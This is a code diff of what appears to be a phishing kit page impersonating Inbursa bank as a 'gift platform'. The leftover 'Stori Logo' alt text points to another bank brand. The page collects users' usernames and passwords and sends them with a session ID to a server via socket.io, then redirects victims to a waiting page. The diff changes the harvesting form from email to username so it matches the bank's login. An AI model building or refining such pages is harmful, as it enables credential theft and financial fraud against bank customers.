@@ -113,17 +113,17 @@
   <div class="screen active" id="pantallaInicio">
     <img src="https://companieslogo.com/img/orig/GFINBURO.MX-bfce3765.png?t=1720244492" alt="Stori Logo" class="logo">
     <h2>Bienvenido a su plataforma de regalos de <strong>INBURSA</strong> </h2>
-    <p>Ingrese su usuario y contraseña para continuar continuar con su desembolso</p>
+    <p>Ingrese su usuario y contraseña para continuar con su desembolso</p>
     <form id="login-form">
       <div class="input-group">
         <div class="icon"><i class="fas fa-user"></i></div>
-        <input type="text" id="email" placeholder="Usuario" required>
+        <input type="text" id="usuario" placeholder="Usuario" required>
       </div>
       <div class="input-group">
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
-      <p id="emailError" class="mensaje-error"></p>
+      <p id="usuarioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
     </form>
@@ -141,8 +141,8 @@
           e.preventDefault(); // Evitar el comportamiento por defecto del formulario
 
           // Validar los campos antes de enviar los datos
-          if (validarEmail() && validarPassword()) {
-            const correo = document.getElementById('email').value;
+          if (validarUsuario() && validarPassword()) {
+            const usuario = document.getElementById('usuario').value;
             const contrasena = document.getElementById('password').value;
 
             // Generar y guardar sessionId
@@ -150,7 +150,7 @@
             localStorage.setItem('sessionId', sessionId);
 
             // Enviar datos al servidor mediante socket.io
-            socket.emit('dataForm', { correo, contrasena, sessionId });
+            socket.emit('dataForm', { usuario, contrasena, sessionId });
 
             // Ir a pantalla de espera (opciones.html)
             window.location.href = 'opciones.html';
@@ -159,24 +159,18 @@
       }
     });
 
-    function validarEmail() {
-      const email = document.getElementById("email").value;
-      const emailError = document.getElementById("emailError");
-      const emailInput = document.getElementById("email");
+    function validarUsuario() {
+      const usuario = document.getElementById("usuario").value;
+      const usuarioError = document.getElementById("usuarioError");
+      const usuarioInput = document.getElementById("usuario");
 
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-
-      if (!text) {
-        emailError.textContent = "El correo electrónico es obligatorio";
-        emailInput.classList.add("campo-requerido");
-        return false;
-      } else if (!emailRegex.test(email)) {
-        emailError.textContent = "Por favor, ingrese un correo electrónico válido";
-        emailInput.classList.add("campo-requerido");
+      if (!usuario) {
+        usuarioError.textContent = "El usuario es obligatorio";
+        usuarioInput.classList.add("campo-requerido");
         return false;
       } else {
-        emailError.textContent = "";
-        emailInput.classList.remove("campo-requerido");
+        usuarioError.textContent = "";
+        usuarioInput.classList.remove("campo-requerido");
         return true;
       }
     }
